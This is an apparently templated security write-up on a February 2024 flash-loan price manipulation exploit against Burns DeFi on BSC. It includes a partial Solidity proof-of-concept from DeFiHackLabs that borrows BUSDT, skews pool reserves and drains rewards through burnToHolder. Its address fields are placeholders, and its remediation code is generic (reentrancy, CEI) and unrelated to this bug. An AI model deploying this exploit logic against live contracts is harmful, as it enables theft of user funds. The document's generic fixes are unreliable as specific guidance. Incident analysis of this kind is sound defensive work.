# Burns DeFi — Flash Loan LP Price Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2024-02-07 |
| **Protocol** | Burns DeFi |
| **Chain** | BSC |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://bscscan.com/address/0x) |
| **Attack Tx** | [0x](https://bscscan.com/tx/0x) |
| **Vulnerable Contract** | [0x](https://bscscan.com/address/0x) |
| **Root Cause** | LP price calculation relies on `getReserves()` spot reserves, allowing reserve manipulation within a single block to distort prices and realize arbitrage profits |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/BurnsDefi_exp.sol) |

---
## 1. Vulnerability Overview

Burns DeFi is a DeFi protocol operating on the BSC chain that suffered a **flash loan / price manipulation** attack on 2024-02-07.
The attacker exploited flash loan-based LP price manipulation, resulting in approximately **unconfirmed** losses.

### Key Vulnerability Summary
- **Classification**: Flash Loan / Price Manipulation
- **Impact**: Unconfirmed loss of protocol assets
- **Attack Vector**: Price Manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: LP price manipulation via flash loan
// The attacker exploits this logic to obtain illegitimate profit

// IBurnsBuild interface — LP price manipulation vulnerable functions
interface IBurnsBuild {
    // ❌ Vulnerable: burnToHolder distributes rewards based on LP pool balance
    // When burnToHolder is called after a large liquidity injection via DVM flashLoan,
    // the LP price is distorted, enabling excessive reward collection
    function burnToHolder(uint256 amount, address _invitation) external;

    // ❌ Vulnerable: receiveRewards calculation is based on instantaneous LP balance
    function receiveRewards(address to) external;
}

interface DVM {
    // ❌ Vulnerable: burnToHolder can be called inside the flashLoan callback (DVMFlashLoanCall)
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address receiver, bytes calldata data) external;
}

interface Uni_Pair_V2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

// ✅ Correct implementation: use cumulative average LP price
function safeBurnToHolder(uint256 amount, address _invitation) external {
    // ✅ Block reward calculation during flash loan
    require(!dvmFlashActive, "Burn: flash loan active");
    // ✅ Use TWAP-based LP price instead of instantaneous balance
    uint256 lpPrice = getTWAPLPPrice();
    require(lpPrice > 0, "Burn: invalid LP price");
    // ✅ Limit large burnToHolder calls within a single block
    require(amount <= maxBurnPerBlock, "Burn: exceeds block limit");
    _processBurn(amount, _invitation, lpPrice);
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Flash Loan Borrow] ──── BSC DEX/Lending
  │                        (Large token borrow)
  ▼
[Price/State Manipulation] ─── Vulnerable Contract
  │                               (Internal state modification)
  ▼
[Illegitimate Profit Extraction] ─── Token withdrawal/swap
  │
  ▼
[Flash Loan Repayment] ──── Profit secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - BurnsDefi_exp.sol
// Chain: BSC | Date: 2024-02-07

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        deal(address(this), 0);
        emit log_named_decimal_uint(
            "Exploiter BUSDT balance before attack", BUSDT.balanceOf(exploiter), BUSDT.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter Burns balance before attack", Burns.balanceOf(exploiter), Burns.decimals()
        );
        // Borrow BUSDT
        bytes memory data = abi.encodePacked(uint8(49));
        DSP.flashLoan(250_000 * 1e18, 0, address(this), data);

        emit log_named_decimal_uint(
            "Exploiter BUSDT balance after attack", BUSDT.balanceOf(exploiter), BUSDT.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter Burns balance after attack", Burns.balanceOf(exploiter), Burns.decimals()
        );
    }

    function DSPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        BUSDTToBurns(baseAmount);

        address[] memory path = new address[](2);
        path[0] = address(Burns);
        path[1] = address(WBNB);
        uint256 amountOut1 = 50e18;
        uint256 amountOut2 = address(Burns).balance - amountOut1;
        uint256[] memory amounts = PancakeRouter.getAmountsIn(amountOut1, path);

        // burnToHolder() use getAmountsOut() and Burns/WBNB pair for making calculations
        BurnsBuild.burnToHolder(amounts[0], exploiter);
        amounts = PancakeRouter.getAmountsIn(amountOut2, path);
        BurnsBuild.burnToHolder(amounts[0], exploiter);
        BurnsBuild.receiveRewards(address(this));
        WBNB.deposit{value: address(this).balance}();

        WBNBToBUSDT();
        BurnsToBUSDT();

        BUSDT.transfer(address(DSP), baseAmount);
        BUSDT.transfer(exploiter, BUSDT.balanceOf(address(this)));
    }

    receive() external payable {}

    function BUSDTToBurns(
        uint256 amount
    ) private {
        // Transfer borrowed BUSDT to BUSDT/WBNB pair and obtain WBNB to deposit to Burns/WBNB pair
        BUSDT.transfer(address(BUSDT_WBNB), amount);
        (uint112 reserveBUSDT, uint112 reserveWBNB,) = BUSDT_WBNB.getReserves();
        uint256 amountWBNB = PancakeRouter.getAmountOut(amount, reserveBUSDT, reserveWBNB);
        // Deposit WBNB to Burns/WBNB
        BUSDT_WBNB.swap(0, amountWBNB, address(Burns_WBNB), "");

        (uint112 reserveBurns, uint112 _reserveWBNB,) = Burns_WBNB.getReserves();
        uint256 amountBurns = PancakeRouter.getAmountOut(amountWBNB, _reserveWBNB, reserveBurns);
```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criteria | Details |
|-----------|------|
| **DASP Top 10** | Price Manipulation |
| **Attack Type** | Flash Loan Attack |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | High (requires flash loan) |
| **Prerequisites** | Sufficient gas fees and flash loan access |
| **Impact Scope** | Partial assets |
| **Patchability** | High (fixable via code modification) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause Vulnerable Functions**: Apply emergency pause to the affected functions
2. **Assess Damage**: Identify the scale of lost assets and classify affected users
3. **Notify Stakeholders**: Immediately inform relevant DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Prevent oracle manipulation (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 audit firms)
- Operate a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Flash loan / price manipulation attacks are preventable**: Proper validation and pattern application can provide defense
2. **Consider economic incentives**: All functions must be designed with attacker economic motivation in mind
3. **Audit priority**: Functions that directly handle assets should be the top audit priority

### For Protocol Operators
1. **Real-time monitoring**: Establish a system to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon an attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-02-07** Burns DeFi incident reconfirms the danger of **flash loan / price manipulation** attacks in the BSC ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was written for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/BurnsDefi_exp.sol)*